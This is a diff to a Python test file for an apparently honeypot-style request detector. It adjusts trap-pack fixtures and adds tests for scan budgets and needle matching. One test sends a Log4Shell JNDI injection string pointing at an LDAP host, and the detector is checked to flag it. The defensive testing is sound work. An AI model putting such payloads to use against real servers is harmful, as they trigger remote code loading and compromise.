@@ -459,7 +459,7 @@ def _full_objs(heavy: bool = True) -> list[dict[str, Any]]:
     for p in range(2):
         items = []
         for t in range(16):
-            conds = [{"in": area, "any": [needle()]} for area in ("blob", "headers")]
+            conds = [{"in": area, "any": [needle()]} for area in ("query", "path")]
             items.append(
                 {
                     "id": f"u{t}",
@@ -594,12 +594,12 @@ def _degenerate_objs() -> list[dict[str, Any]]:
         }  # fmt: skip
 
     objs = []
-    for p in range(2):  # 32 unpathed traps, 64 distinct needles
+    for p in range(1):  # unpathed: as many header needles as the scan bound allows (15)
         items = [
             {"id": f"u{t}", "level": "probe", "outcome": {"flags": [f"deg_u{p}"]},
              "match": {"needles": [{"in": area, "any": ["a" * 200 + f"b{p}{t:02d}"]}
-                                   for area in ("headers", "blob")]}}
-            for t in range(16)
+                                   for area in ("headers",)]}}
+            for t in range(15)
         ]  # fmt: skip
         objs.append(base(f"deg-unpathed-{p}", items))
     for p in range(28):
@@ -645,7 +645,7 @@ def test_crafted_worst_case_cost_is_bounded() -> None:
     validated = [fmt.validate_pack(o) for o in _degenerate_objs()]
     kept, _ = fmt.select(validated, TODAY)
     ts = traps.TrapSet.from_packs(kept)
-    assert sum(1 for p in kept if p.id.startswith("deg-unpathed")) == 2
+    assert sum(1 for p in kept if p.id.startswith("deg-unpathed")) == 1
     crafted = _crafted_request()
     samples = [_added_ms(ts, crafted) for _ in range(20)]
     assert max(samples) < 5.0, samples
@@ -693,3 +693,81 @@ async def test_no_pack_answers_or_flags_an_exploit_on_the_benign_corpus() -> Non
         assert [h.trap.id for h in a.trap_hits if h.trap.level == "exploit"] == [], path.name
         assert a.cve == [], path.name
         assert site.trap_outcome(r, _ctx(), a.trap_hits, ts.groups) is None, path.name
+
+
+# -- third review --------------------------------------------------------------------------------
+
+
+def _filler_unpathed() -> list[dict[str, Any]]:
+    """Unpathed packs at the load limits that sort before the bundled ones (ids "aaa-*", two
+    conditions each), with needles that never match."""
+    objs = []
+    for p in range(2):
+        # p=0: 12 two-condition traps searching the headers; together with p=1 they fill the
+        # scan bound (12 x 38 KiB + 12 x 4 KiB, about 505 KiB of 512 KiB);
+        # p=1: query and path needles up to the count limit.
+        areas = ("headers", "path") if p == 0 else ("query", "path")
+        items = [
+            {"id": f"f{t}", "level": "probe", "outcome": {"flags": [f"fill_{p}"]},
+             "match": {"needles": [{"in": a, "any": [f"zz{p}{t}-never-{a}"]} for a in areas]}}
+            for t in range(12 if p == 0 else 6)
+        ]  # fmt: skip
+        objs.append(
+            {
+                "schema": "suckerpot-trap/1",
+                "id": f"aaa-filler-{p}",
+                "version": 1,
+                "engine": 1,
+                "sensor": "web",
+                "title": "filler",
+                "cve": [],
+                "disclosed": "2026-11-19",
+                "product": {"vendor": "V", "name": "N"},
+                "tag": f"aaa-filler-{p}",
+                "traps": items,
+            }
+        )
+    return objs
+
+
+def test_bundled_detection_survives_a_padded_request_and_filler_packs() -> None:
+    """B1: with filler packs at the limits and a request whose headers are padded to 32 KiB, the
+    bundled log4shell traps still run (they run first and outside the budget) and flag."""
+    bundle_doc = json.loads(traps.BUNDLED.read_bytes())
+    data = _bundle(*bundle_doc["packs"], *_filler_unpathed())
+    ts = traps.load_bytes(data, today=TODAY)
+    ids = [p.id for p in ts.packs]
+    assert {"aaa-filler-0", "aaa-filler-1", "log4j-log4shell"} <= set(ids), ts.rejected
+    pad = [(f"X-Pad-{i}", "p" * 1000) for i in range(32)]
+    r = req(
+        path="/", headers=[("Host", "192.0.2.10"), ("X-Api", "${jndi:ldap://192.0.2.7/a}"), *pad]
+    )
+    a = Detector(Config(), ts).analyze(r, "192.0.2.1")
+    assert "log4shell" in a.flags and a.trap_budget == 0
+    # Core packs run first.
+    assert all(p.id in fmt.CORE_PACKS for p, _ in ts._traps[:6])
+
+
+def test_suffix_header_needles_do_not_match_common_headers() -> None:
+    """F1 at run time: an anchored "-agent: mozilla/5.0" needle does not match "User-Agent"."""
+    obj = edgegate()
+    obj["traps"][1]["match"] = {"needles": [{"in": "headers", "any": ["-agent: mozilla/5.0"]}]}
+    obj["traps"][0]["match"] = {"needles": [{"in": "headers", "any": ["x-edge: mozilla/5.0"]}]}
+    ts = trapset(obj)
+    browser = req(headers=[("Host", "h"), ("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")])
+    assert _match(ts, browser) == set()
+    first = req(headers=[("X-Edge", "Mozilla/5.0 (x)"), ("Host", "h")])
+    assert _match(ts, first) == {"version-probe"}  # also the first header line
+
+
+def test_param_needles_match_only_whole_keys() -> None:
+    """F2 at run time: "og=admin" matches the key "og", never "log=admin"; the first parameter
+    matches too."""
+    obj = edgegate()
+    obj["traps"][1]["match"] = {"needles": [{"in": "body", "any": ["og=admin"]}]}
+    obj["traps"][1]["outcome"]["claim_cve"] = False
+    obj["traps"][1].pop("respond")
+    ts = trapset(obj)
+    assert _match(ts, req("POST", "/q", body=b"log=admin&pwd=x")) == set()
+    assert _match(ts, req("POST", "/q", body=b"og=admin&pwd=x")) == {"diag-rce"}
+    assert _match(ts, req("POST", "/q", body=b"a=1&og=admin")) == {"diag-rce"}
